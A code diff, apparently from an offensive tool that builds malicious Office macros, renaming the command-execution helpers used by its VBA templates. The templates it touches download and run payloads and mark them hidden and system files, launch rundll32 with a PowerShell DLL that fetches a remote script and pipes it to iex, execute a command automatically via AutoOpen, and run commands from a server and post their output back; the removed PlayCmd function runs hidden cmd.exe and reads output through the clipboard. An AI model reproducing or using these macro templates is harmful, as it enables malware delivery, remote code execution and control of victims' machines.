@@ -41,7 +41,7 @@ Private Sub DownloadAndExecute()
         oStream.Write WinHttpReq.ResponseBody
         oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        WscriptExec downloadPath
+        ExecuteCmdAsync downloadPath
     End If    
     
 End Sub
@@ -84,7 +84,7 @@ Private Sub DownloadAndExecute()
             oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
             SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
-            WscriptExec downloadPath
+            ExecuteCmdAsync downloadPath
         End If
        
     End If
@@ -113,7 +113,7 @@ Public Function Debugging() As Variant
     DownloadDLL
     Dim strCmd As String
     strCmd = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<POWERSHELL_SCRIPT_URL>>> } ^| iex;"
-    WscriptExec strCmd
+    ExecuteCmdAsync strCmd
 End Function
 
 
@@ -373,7 +373,7 @@ r"""
 
 Private Sub executeEmbed()
     DumpFile "<<<OUT_FILE>>>"
-    CreateObject("WScript.Shell").Run "<<<OUT_FILE>>>", 0
+    ExecuteCmdAsync "<<<OUT_FILE>>>"
 End Sub
 
 ' Auto launch when VBA enabled
@@ -387,7 +387,7 @@ CMD = \
 r"""
 
 Sub AutoOpen()
-    WscriptExec "<<<CMD>>>"
+    ExecuteCmdAsync "<<<CMD>>>"
 End Sub
 
 """
@@ -407,7 +407,7 @@ Private Sub Main()
     serverUrl = "<<<TEMPLATE>>>"
     msg = "<<<TEMPLATE>>>"
     On Error GoTo byebye
-    msg = PlayCmd(msg)
+    msg = ExecuteCmdSync(msg)
     SendResponse msg
     On Error GoTo 0
     byebye:
@@ -445,17 +445,6 @@ Private Function SendResponse(cmdOutput)
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
-' Play and return output any command line
-Private Function PlayCmd(sCmd As String) As String
-    'Run a shell command, returning the output as a string'
-    ' Using a hidden window, pipe the output of the command to the CLIP.EXE utility...
-    ' Necessary because normal usage with oShell.Exec("cmd.exe /C " & sCmd) always pops a windows
-    Dim instruction As String
-    instruction = "cmd.exe /c " & sCmd & " | clip"
-    CreateObject("WScript.Shell").Run instruction, 0, True
-    ' Read the clipboard text using htmlfile object
-    PlayCmd = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
-End Function
 
 """
 
